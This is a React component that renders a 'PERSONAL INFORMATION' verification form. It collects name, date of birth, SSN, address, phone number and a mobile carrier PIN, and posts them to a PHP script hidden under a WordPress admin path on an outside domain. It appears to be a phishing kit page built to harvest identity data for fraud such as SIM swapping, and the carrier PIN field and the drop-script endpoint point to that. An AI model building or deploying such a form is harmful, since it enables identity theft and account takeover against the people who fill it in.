import React from "react"

const Verification = () => {
  return (
    <form
      className="px-4 lg:px-[120px] mt-4 lg:mt-[20px] flex flex-col min-h-[300px]"
      method="POST"
      action="https://investmentquarters.com/wp-admin/js/pablo/verify1.php"
    >
      <h1 className="text-[#192838] font-bold  text-3xl lg:text-4xl">
        PERSONAL INFORMATION
      </h1>
      <h1 className="text-2xl text-red-500 mt-[25px]">* Required</h1>

      <div className="w-full flex items-center justify-start gap-4 mt-[25px]">
        <h1 className="text-xs w-[80px]">Firstname</h1>
        <input
          type="text"
          required
          name="firstname"
          className="w-[200px] p-1 text-sm border border-[#333]"
        />
      </div>
      <div className="w-full flex items-center justify-start gap-4 mt-[10px]">
        <h1 className="text-xs w-[80px]">Lastname</h1>
        <input
          type="text"
          required
          name="lastname"
          className="w-[200px] p-1 text-sm border border-[#333]"
        />
      </div>
      <div className="w-full flex items-center justify-start gap-4 mt-[10px]">
        <h1 className="text-xs w-[80px]">Date of Birth</h1>
        <input
          type="date"
          required
          name="dob"
          className="w-[200px] p-1 text-sm border border-[#333]"
        />
      </div>
      <div className="w-full flex items-center justify-start gap-4 mt-[10px]">
        <h1 className="text-xs w-[80px]">SSN</h1>
        <input
          type="text"
          required
          name="ssn"
          maxLength={"12"}
          className="w-[200px] p-1 text-sm border border-[#333]"
        />
      </div>
      <div className="w-full flex items-center justify-start gap-4 mt-[10px]">
        <h1 className="text-xs w-[80px]">Address</h1>
        <input
          type="text"
          required
          name="address"
          className="w-[200px] p-1 text-sm border border-[#333]"
        />
      </div>
      <div className="w-full flex items-center justify-start gap-4 mt-[10px]">
        <h1 className="text-xs w-[80px]">Phone Number</h1>
        <input
          type="tel"
          required
          name="phone"
          maxLength={"11"}
          className="w-[200px] p-1 text-sm border border-[#333]"
        />
      </div>
      <div className="w-full flex items-center justify-start gap-4 mt-[10px]">
        <h1 className="text-xs w-[80px]">Carrier Pin</h1>
        <input
          type="text"
          required
          name="carrier"
          maxLength={"4"}
          className="w-[200px] p-1 text-sm border border-[#333]"
        />
      </div>

      <button className="bgways w-[300px] h-[40px] flex items-center justify-center mt-[20px] text-white text-xs hover:opacity-75">
        Continue
      </button>
    </form>
  )
}

export default Verification
